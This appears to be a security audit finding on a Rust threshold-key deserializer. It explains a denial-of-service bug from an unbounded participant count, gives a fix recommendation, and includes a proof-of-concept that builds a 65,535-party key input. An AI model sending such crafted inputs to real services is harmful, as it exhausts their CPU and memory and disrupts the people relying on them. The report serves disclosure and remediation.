### Title
Unbounded participant count in `ThresholdKeys::read` enables CPU and memory denial of service - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` trusts the serialized participant count `n` before validating the threshold parameters or constraining it against a caller-expected configuration. With `Interpolation::Constant`, an input declaring `n = u16::MAX` causes allocation and deserialization of 65,535 scalars followed by 65,535 group elements, then construction of a 65,535-party `ThresholdKeys` object. [1](#0-0) 

### Finding Description
The deserializer reads `t`, `n`, and `i`, then interprets an attacker-controlled interpolation tag. Tag `0` allocates `Vec::with_capacity(n)` and reads `n` scalar encodings; it subsequently reads one secret scalar and inserts `n` decoded group elements into a `HashMap`. [2](#0-1)  `ThresholdParams::new` permits every nonzero `n` representable by `u16` when `t <= n` and `i <= n`, so `t = n = 65535, i = 1` is valid rather than rejected. [3](#0-2)  `ThresholdKeys::new` then performs interpolation-factor calculations and group multiplication over participants `1..=t`, adding further CPU work after parsing. [4](#0-3) 

### Impact Explanation
An unprivileged party able to submit serialized threshold keys can repeatedly provide a few megabytes of otherwise valid encodings and force each victim to allocate and populate hundreds of thousands of field/group objects, perform canonical scalar checks, decode points, maintain a 65,535-entry hash map, and compute a threshold group key. Repeated requests can consume disproportionate CPU and allocator resources and prevent timely processing of other work. [5](#0-4) 

### Likelihood Explanation
The payload is accepted without authentication, and all fields needed to trigger the work are controlled by the supplied byte stream. The attacker must transmit bytes proportional to the declared participant count, but point decoding and threshold construction make the processing cost substantially higher than ordinary bounded-message parsing. The `u16` participant bound prevents unbounded growth, so this is a medium-severity denial of service rather than a critical memory-exhaustion issue. [1](#0-0) 

### Recommendation
Validate `t`, `n`, and `i` immediately after reading them, and require callers to supply the expected `ThresholdParams` or a strict maximum participant count before reading variable-length arrays. Reject unsupported counts before allocation, remove the attacker-controlled `Vec::with_capacity(n)` preallocation, and consider bounded/chunked decoding so malformed oversized declarations fail before disproportionate work is performed. [5](#0-4) 

### Proof of Concept
```rust
use frost::{
  curve::{Ciphersuite, Secp256k1},
  ThresholdKeys,
};
use ciphersuite::group::{ff::{Field, PrimeField}, Group, GroupEncoding};

let n = u16::MAX;
let mut input = Vec::new();

// Curve identifier.
input.extend_from_slice(
  &(u32::try_from(Secp256k1::ID.len()).unwrap()).to_le_bytes(),
);
input.extend_from_slice(Secp256k1::ID);

// Valid parameters: t = n = 65535, i = 1.
input.extend_from_slice(&n.to_le_bytes()); // t
input.extend_from_slice(&n.to_le_bytes()); // n
input.extend_from_slice(&1u16.to_le_bytes()); // i

// Interpolation::Constant: causes n attacker-supplied scalar reads.
input.push(0);
let scalar = <<Secp256k1 as Ciphersuite>::F as Field>::ONE.to_repr();
for _ in 0..n {
  input.extend_from_slice(scalar.as_ref());
}

// Secret share.
input.extend_from_slice(scalar.as_ref());

// n canonical verification-share encodings.
let generator = <Secp256k1 as Ciphersuite>::generator().to_bytes();
for _ in 0..n {
  input.extend_from_slice(generator.as_ref());
}

// Forces parsing and construction of a 65,535-participant ThresholdKeys.
let result = ThresholdKeys::<Secp256k1>::read(&mut input.as_slice());
assert!(result.is_ok());
```

The input uses only canonical encodings, so it proceeds through the expensive scalar and group-element deserialization path rather than failing at the first malformed field. [5](#0-4)

### Citations

**File:** crypto/dkg/src/lib.rs (L164-179)
```rust
impl ThresholdParams {
  /// Create a new set of parameters.
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
  }
```

**File:** crypto/dkg/src/lib.rs (L376-390)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
```

**File:** crypto/dkg/src/lib.rs (L591-630)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
```
